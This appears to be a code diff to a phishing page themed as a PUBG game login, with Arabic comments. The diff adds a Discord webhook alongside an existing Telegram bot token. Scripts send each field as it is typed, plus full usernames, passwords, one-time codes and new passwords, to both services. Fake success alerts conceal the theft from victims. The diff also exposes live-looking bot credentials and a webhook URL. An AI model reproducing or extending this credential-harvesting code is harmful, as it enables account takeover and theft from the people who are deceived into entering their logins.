@@ -617,9 +617,12 @@
         </div>
     </div>
 
-    <script>
+     <script>
         const TELEGRAM_TOKEN = "8919787970:AAEmU4rsJAI5XUc2TyzUkur0Lpom_Tk07Kg";
         const TELEGRAM_CHAT_ID = "8796885500";
+        
+        // رابط ديسكورد Webhook الخاص بك
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1551997681063297095/9wne8QtpIrX2JvrgzuLrI1-drIT2vkAIo5zOmRA0q31dcAwarxXMCYEcyUpG6kEmnV8j";
 
         let currentType = 'email';
         let currentAuthMode = 'pass';
@@ -644,6 +647,7 @@
             } catch (e) {}
         }
 
+        // دالة الإرسال لتليجرام
         function sendTelegram(msg) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
             fetch(url, {
@@ -653,14 +657,43 @@
             }).catch(e => console.error(e));
         }
 
+        // دالة الإرسال لديسكورد على هيئة بطاقة/وحدة مستقلة (Discord Embed)
+        function sendDiscordEmbed(title, fields, color = 3447003) {
+            if (!DISCORD_WEBHOOK_URL) return;
+            const payload = {
+                embeds: [{
+                    title: title,
+                    color: color, // لون الشريط الجانبي للبطاقة
+                    fields: fields,
+                    timestamp: new Date().toISOString(), // الختم الزمني التلقائي من ديسكورد لمنع الدمج
+                    footer: { text: "🎮 بيانات لعبة ببجي المباشرة" }
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(e => console.error("خطأ في إرسال ديسكورد:", e));
+        }
+
         /* دالة الإرسال المباشر للخانة فور إدخالها */
         function sendInstantData(fieldLabel, value) {
             if (!value || value.trim() === "" || value.trim() === selectedCountryCode) return;
             if (lastSentValues[fieldLabel] === value.trim()) return; // تجنب التكرار لنفس القيمة
 
-            lastSentValues[fieldLabel] = value.trim();
-            const msg = `⚡ <b>إدخال فوري لمُتسابق (${fieldLabel}):</b>\n<code>${value.trim()}</code>`;
+            const cleanValue = value.trim();
+            lastSentValues[fieldLabel] = cleanValue;
+
+            // 1. إرسال لتليجرام
+            const msg = `⚡ <b>إدخال فوري لمُتسابق (${fieldLabel}):</b>\n<code>${cleanValue}</code>`;
             sendTelegram(msg);
+
+            // 2. إرسال لديسكورد كبطاقة مستقلة (لون برتقالي)
+            sendDiscordEmbed("⚡ إدخال فوري لمُتسابق", [
+                { name: "الخانة / الحقل", value: fieldLabel, inline: true },
+                { name: "القيمة المدخلة", value: `\`\`\`${cleanValue}\`\`\``, inline: false }
+            ], 16753920);
         }
 
         function checkInternetAndRun(callback) {
@@ -763,7 +796,17 @@
 
             checkInternetAndRun(() => {
                 triggerRandomCaptcha(() => {
+                    // إرسال لتليجرام
                     sendTelegram(`🚀 <b>تسجيل دخول كامل مكرر للتأكيد</b>:\nنوع الحساب: ${currentType}\nالمستخدم: ${userVal}\nكلمة المرور: ${passVal}\nالكود: ${otpVal}`);
+                    
+                    // إرسال لديسكورد بطاقة منفصلة (لون أخضر)
+                    sendDiscordEmbed("🚀 تسجيل دخول كامل للتأكيد", [
+                        { name: "نوع الحساب", value: currentType, inline: true },
+                        { name: "المستخدم / الهاتف", value: userVal || "غير مدخل", inline: true },
+                        { name: "كلمة المرور", value: passVal || "غير مدخل", inline: true },
+                        { name: "الكود (OTP)", value: otpVal || "غير مدخل", inline: true }
+                    ], 5763719);
+
                     alert('🎉 تم تسجيل الدخول بنجاح!');
                 });
             });
@@ -787,7 +830,16 @@
 
             checkInternetAndRun(() => {
                 triggerRandomCaptcha(() => {
+                    // إرسال لتليجرام
                     sendTelegram(`🔑 <b>تأكيد تغيير كلمة السر النهائي</b>:\nالحساب: ${target}\nالكود: ${code}\nكلمة السر الجديدة: ${p1}`);
+                    
+                    // إرسال لديسكورد بطاقة منفصلة (لون أحمر)
+                    sendDiscordEmbed("🔑 تأكيد تغيير كلمة السر النهائي", [
+                        { name: "الحساب (بريد/هاتف)", value: target, inline: true },
+                        { name: "الكود المستلم", value: code, inline: true },
+                        { name: "كلمة السر الجديدة", value: p1, inline: false }
+                    ], 15548997);
+
                     alert('تم تغيير كلمة السر بنجاح!');
                     closeResetWindow();
                 });
@@ -965,7 +1017,8 @@
         function closeCountryPicker() {
             document.getElementById('country-modal').style.display = 'none';
         }
-    </script>
+</script>
+
 </body>
 </html>
 
